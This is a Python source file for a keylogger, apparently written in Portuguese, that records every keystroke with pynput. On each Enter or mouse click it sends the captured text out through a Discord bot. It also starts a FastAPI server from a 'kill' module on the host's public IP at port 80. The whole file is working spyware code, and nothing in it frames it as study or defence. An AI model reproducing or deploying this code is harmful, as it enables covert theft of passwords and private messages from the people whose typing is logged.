from pynput.keyboard import Key, Listener
from pynput import mouse
import threading
import os
import asyncio
import kill
import discord_bot
from dotenv import load_dotenv
from funcoes import send
import uvicorn
import requests

load_dotenv()
ip_publico = requests.get('https://httpbin.org/ip').json()['origin']


fullog = ''
words = ''

def reset_logs():
    global fullog, words
    fullog = ''
    words = ''

def onPress(key):
    global fullog, words

    if key == Key.space:
        words += ' '
    elif key == Key.enter:
        fullog += words + '\n'
        asyncio.run(discord_bot.send_message(fullog))  # Envia pelo bot
        reset_logs()
    elif key == Key.backspace:
        words = words[:-1]
    else:
        try:
            char = key.char
            if char:
                words += char
        except AttributeError:
            pass

    if key == Key.esc:
        return False

def click(x, y, button, pressed):
    global fullog, words
    if pressed and len(words) > 0:
        fullog += words + '\n'
        asyncio.run(discord_bot.send_message(fullog))  # Envia pelo bot
        reset_logs()

def run_api():
    uvicorn.run(kill.app, host=ip_publico, port=80)
    print(f'servidor rodando no ip: {ip_publico}' )

def main():
    # roda FastAPI em background
    threading.Thread(target=run_api, daemon=True).start()

    # roda bot Discord em background
    threading.Thread(target=discord_bot.start_bot, daemon=True).start()

    # listeners de teclado e mouse rodando na thread principal
    k_listener = Listener(on_press=onPress)
    m_listener = mouse.Listener(on_click=click)

    k_listener.start()
    m_listener.start()

    k_listener.join()
    m_listener.join()

if __name__ == "__main__":
    main()